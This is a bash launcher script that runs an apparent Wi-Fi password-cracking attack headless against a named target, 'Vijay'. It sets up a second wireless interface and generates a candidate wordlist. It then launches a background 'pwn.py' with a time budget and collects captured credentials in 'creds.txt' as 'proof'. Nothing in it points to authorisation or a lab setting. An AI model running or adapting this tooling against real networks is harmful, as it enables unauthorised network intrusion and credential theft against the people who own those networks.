#!/bin/bash
# run.sh - 2hr headless entry point. Keeps wlan0 untouched; all work on wlan1.
# Usage: sudo ./run.sh --target Vijay --time 100
set -u
TARGET=Vijay
BUDGET=100
OUT=./results
while [ $# -gt 0 ]; do case "$1" in
  --target) TARGET="$2"; shift 2;;
  --time) BUDGET="$2"; shift 2;;
  --out) OUT="$2"; shift 2;;
  *) echo "unknown $1"; exit 1;;
esac; done
if [ "$(id -u)" -ne 0 ]; then echo "run as root: sudo ./run.sh"; exit 1; fi
mkdir -p "$OUT"
echo "[*] target=$TARGET budget=${BUDGET}m out=$OUT"
./setup_wlan1.sh || exit 1
./candidates.sh "$TARGET" /tmp/pwn-words || echo "[!] candidates partial"
nohup python3 ./pwn.py --target "$TARGET" --time "$BUDGET" --out "$OUT" --words /tmp/pwn-words/combined.txt > "$OUT/console.log" 2>&1 &
echo "[*] pwn started pid=$! log=$OUT/console.log ; wlan0 stays on B1-405"
echo "[*] watch: tail -f $OUT/console.log ; proof: cat $OUT/creds.txt $OUT/result.json"
